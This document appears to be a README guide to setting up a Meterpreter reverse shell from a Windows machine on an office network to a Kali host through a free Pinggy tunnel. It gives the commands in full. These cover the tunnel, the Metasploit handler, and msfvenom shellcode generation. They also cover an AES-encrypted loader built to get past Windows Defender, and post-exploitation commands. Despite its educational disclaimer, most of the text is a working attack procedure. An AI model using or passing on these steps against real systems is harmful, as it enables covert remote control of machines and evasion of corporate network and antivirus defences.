🚀 Free Windows-to-Linux Reverse Shell (C2) via Pinggy Tunnel

This repository/documentation provides a step-by-step guide to establishing a Command & Control (C2) connection between a Windows machine (behind a strict Office Network) and a Kali Linux machine (behind a Home WiFi/NAT).

Since port forwarding is impossible without a public IP, we use Pinggy (a free SSH-based TCP tunnel) as a bridge, and AES encryption to bypass basic Windows Defender signatures.

⚠️ Disclaimer: This guide is strictly for educational purposes, authorized penetration testing, and Red Team labs. Do not use this on systems you do not own or have explicit permission to test.

---

📋 Prerequisites

-   Kali Linux (Attacker Machine)
-   Windows Machine (Target Machine)
-   git, python3, pip3, mingw-w64
-   Metasploit Framework installed on Kali

---

🏗️ Phase 1: Network Traversal (Pinggy Tunnel)

Since the target is on an office network, inbound connections are blocked. Pinggy creates an outbound connection from Kali to a public server, providing a public URL that forwards traffic back to Kali.

1.  Open Terminal 1 on Kali.
2.  Establish the TCP tunnel (pointing to local port 5555):
    
    bash
    ssh -p 443 -R0:localhost:5555 tcp@free.pinggy.io
    When prompted for a password, press Enter (no password required).
    
    

Note down your Public Address & Port:

text  
tcp://xyz-abc-123.run.pinggy-free.link:37779  
(Note: The domain is xyz-abc-123.run.pinggy-free.link and the port is 37779. Also note: Free Pinggy tunnels expire every 60 minutes).

🏗️ Phase 2: Setup Metasploit Listener  
Open Terminal 2 on Kali.

Start Metasploit:

bash  
msfconsole -q  
Configure the listener (Ensure you use the stageless payload with an underscore  to prevent tunnel crashes):

bash  
use exploit/multi/handler  
set payload windows/x64/meterpreterreversetcp  
set LHOST 127.0.0.1  
set LPORT 5555  
set ReverseListenerBindAddress 127.0.0.1  
set ReverseListenerBindPort 5555  
set ExitOnSession false  
exploit -j  
(Troubleshooting: If you get a BindFailed error, the port is in use. Run sudo lsof -i :5555 and kill the PID using sudo kill -9 ).

🏗️ Phase 3: Payload Generation (AES Bypass)  
Standard .exe payloads are easily flagged by Antivirus. We will generate raw shellcode and compile it using a custom AES loader.

Install dependencies (if not already installed):

bash  
sudo apt update  
sudo apt install -y git python3 python3-pip mingw-w64  
pip3 install pycryptodome  
Clone the shellcode runner:

bash  
git clone [https://github.com/jaytiwari05/shellcoderunner.git](https://github.com/jaytiwari05/shellcoderunner.git)  
cd shellcoderunner  
Generate Raw Shellcode (Replace LHOST and LPORT with your Pinggy details from Phase 1):

bash  
msfvenom -p windows/x64/meterpreterreversetcp LHOST=xyz-abc-123.run.pinggy-free.link LPORT=37779 -f raw -o payload.bin  
Encrypt and Compile the Loader:

bash  
python3 shellcoderunneraes.py payload.bin --aes MySecretPassword --compile  
Expected Output: [+] Build successful: runner.exe

🏗️ Phase 4: Execution & Post-Exploitation  
Transfer the newly created runner.exe to the target Windows machine.

Run runner.exe on Windows.

Check Terminal 2. If successful, you will see:

text  
[] Meterpreter session 1 opened (127.0.0.1:5555 -> 127.0.0.1:xxxxx)  
Interact with the session:

bash  
sessions -i 1  
sysinfo  
getuid  
Drop into a Windows shell:

bash  
shell  
whoami /priv
